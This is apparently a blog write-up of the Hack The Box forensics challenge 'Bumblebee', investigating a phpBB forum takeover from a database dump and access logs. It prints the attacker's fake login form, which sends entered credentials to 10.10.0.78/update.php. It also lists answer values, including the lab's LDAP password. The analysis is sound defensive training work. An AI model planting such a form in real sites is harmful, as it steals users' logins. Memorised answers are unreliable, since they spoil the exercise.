---
Title: "HTB: Bumblebee"
date: 2025-05-11
tags: [linux, database]
Draft: False
---

## 1. Scenario Introduction

A contractor appears to have accessed the internal forum through Forela's guest Wi-Fi and stolen the administrator account's credentials! Some logs from the forum and a full database dump (in sqlite3 format) have been attached for your investigation.

#### 1-1. Related Technologies
- Database Analysis
- access.log Analysis

## 2. Background Knowledge

None

## 3. Analysis

### 3-1. Download Evidence File
1. Open the link below in a browser to download the file, or find the `bumblebee.zip` file in the study materials and move it to your analysis OS: [filename](link)
2. Use `7z` to extract the archive. The password is `hacktheblue`.
```bash
┌──(kali㉿kali)-[~/htb_sherlock/Bumblebee]
└─$ 7z x bumblebee.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 85099 bytes (84 KiB)

Extracting archive: bumblebee.zip
--
Path = bumblebee.zip
Type = zip
Physical Size = 85099

    
Enter password (will not be echoed):
Everything is Ok

Size:       86837
Compressed: 85099
```

### 3-2. Initial Analysis
#### 3-2-1. Extracting Artifacts
```bash
┌──(kali㉿kali)-[~/htb_sherlock/Bumblebee]
└─$ ls
bumblebee.zip  incident.tgz



┌──(kali㉿kali)-[~/htb_sherlock/Bumblebee]
└─$ file incident.tgz                
incident.tgz: gzip compressed data, from Unix, original size modulo 2^32 1249280



┌──(kali㉿kali)-[~/htb_sherlock/Bumblebee]
└─$ tar -xzvf incident.tgz 
./phpbb.sqlite3
access.log



┌──(kali㉿kali)-[~/htb_sherlock/Bumblebee]
└─$ ls
access.log  bumblebee.zip  incident.tgz  phpbb.sqlite3
```

### 3-3. Problem Solving
#### Q1. What is the username of the contractor?

Open the sqlite3 file using SQLiteBrowser.
Check the `phpbb_users` table to see a list of all user accounts.
Scrolling to the bottom, you will find an account with the email domain `contractor.net`.

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_1.png]]

#### Q2. What is the IP address the contractor used to create the account?

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_2.png]]

IP Address: 10.10.0.78

#### Q3. What is the `post_id` of the malicious post created by the contractor?

This time, let's look at the `phpbb_posts` table to see the list of posts.
There are three posts, one of which was created from the same IP as the contractor (10.10.0.78).

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_3.png]]

The `post_id` is 9.

#### Q4. What is the URI to which the credential stealer sends data?

Check the `post_text` field of the post. It appears to be HTML code. Beautify it to view the source code.

You will see a form that uses the local IP.

```html
<form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
	<div class="panel">
		<div class="inner">
			<div class="content">
				<h2 class="login-title">Login</h2>
				<fieldset class="fields1">
					<dl> <dt><label for="username">Username:</label></dt>
						<dd>
							<input type="text" tabindex="1" name="username" id="username" size="25" value="" class="inputbox autowidth">
						</dd>
					</dl>
					<dl> <dt><label for="password">Password:</label></dt>
						<dd>
							<input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off">
						</dd>
					</dl>
					<dl>
						<dd>
							<label for="autologin">
								<input type="checkbox" name="autologin" id="autologin" tabindex="4">Remember me</label>
						</dd>
						<dd>
							<label for="viewonline">
								<input type="checkbox" name="viewonline" id="viewonline" tabindex="5">Hide my online status this session</label>
						</dd>
					</dl>
					<dl> <dt>&nbsp;</dt>
						<dd>
							<input type="submit" name="login" tabindex="6" value="Login" class="button1" onclick="sethidden()">
						</dd>
					</dl>
				</fieldset class="fields1">
			</div>
		</div>
	</div>
</form>
```

The code appears to be a fake login page that sends the entered information to `http://10.10.0.78/update.php`.

Malicious URI: `http://10.10.0.78/update.php`

#### Q5. What time did the contractor log in as `administrator`?

Check `access.log`.
Searching for the keywords `login` and `10.10.0.78` shows records related to login attempts from that IP, and there is a point where the SID changes.

However, this alone is not enough evidence to confirm a login as `administrator`.
Instead, check the `phpbb_log` table in the Sqlite3 DB.

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_5.png]]

Login time: 26/04/2023 10:53:12

#### Q6. Plaintext credentials for the LDAP connection are stored in the forum. What is the password?

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_6.png]]

Checking the `phpbb_config` table reveals the LDAP credentials: `Passw0rd1`

#### Q7. What is the `User-Agent` of the `Administrator` account?

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_5.png]]

From the previously checked log records, we can identify the legitimate administrator's IP: 10.255.254.2

Based on this, we can check `access.log` to find the User-Agent.

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_7.png]]

User-Agent: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36`

#### Q8. What time did the contractor add themselves to the Administrator group?

This can be confirmed in the `phpbb_log` table.

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_8.png]]

Time: 26/04/2023 10:53:51

#### Q9. What time did the contractor download the database backup file?

Searching `access.log` for the attacker's IP (10.10.0.78) and the keyword "backup" reveals the database backup download record.

![[public/Images/content/Security/DFIR/BUMBLEBEE/bbb_9.png]]

Download time: 26/04/2023 11:01:38

#### Q10. What is the size of the backup file?

The size is also included in the download log in `access.log`: 34707
